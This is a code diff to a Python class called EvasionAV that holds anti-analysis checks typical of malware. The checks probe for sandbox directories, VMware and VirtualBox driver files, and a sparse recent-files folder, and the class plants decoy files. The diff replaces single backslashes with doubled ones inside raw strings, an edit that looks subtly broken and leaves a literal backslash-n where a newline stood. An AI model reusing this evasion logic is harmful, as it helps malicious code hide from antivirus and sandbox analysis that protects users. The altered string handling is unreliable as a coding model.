@@ -43,7 +43,7 @@ class EvasionAV:
         return True
     
     def _check_sandbox_files(self):
-        sandbox_files = [r'C:\analysis', r'C:\sandbox', r'C:\cwsandbox', r'C:\sample', r'C:\virus']
+        sandbox_files = [r'C:\\analysis', r'C:\\sandbox', r'C:\\cwsandbox', r'C:\\sample', r'C:\\virus']
         for path in sandbox_files:
             if os.path.exists(path):
                 return True
@@ -51,10 +51,10 @@ class EvasionAV:
     
     def _check_vm_artifacts(self):
         vm_files = [
-            r'C:\windows\system32\drivers\vmmouse.sys',
-            r'C:\windows\system32\drivers\vmhgfs.sys',
-            r'C:\windows\system32\drivers\vboxmouse.sys',
-            r'C:\windows\system32\vboxdisp.dll'
+            r'C:\\windows\\system32\\drivers\\vmmouse.sys',
+            r'C:\\windows\\system32\\drivers\\vmhgfs.sys',
+            r'C:\\windows\\system32\\drivers\\vboxmouse.sys',
+            r'C:\\windows\\system32\\vboxdisp.dll'
         ]
         
         for file in vm_files:
@@ -110,7 +110,7 @@ class EvasionAV:
     
     def _check_user_interaction(self):
         try:
-            recent_path = os.path.join(os.environ.get('APPDATA', ''), r'Microsoft\Windows\Recent')
+            recent_path = os.path.join(os.environ.get('APPDATA', ''), r'Microsoft\\Windows\\Recent')
             if os.path.exists(recent_path):
                 files = os.listdir(recent_path)
                 return len(files) < 5
@@ -170,7 +170,7 @@ class EvasionAV:
             for senuelo in senuelos:
                 if not os.path.exists(senuelo):
                     with open(senuelo, 'w') as f:
-                        f.write(f"# Configuration\n")
+                        f.write(f"# Configuration\\n")
         except:
             pass
     
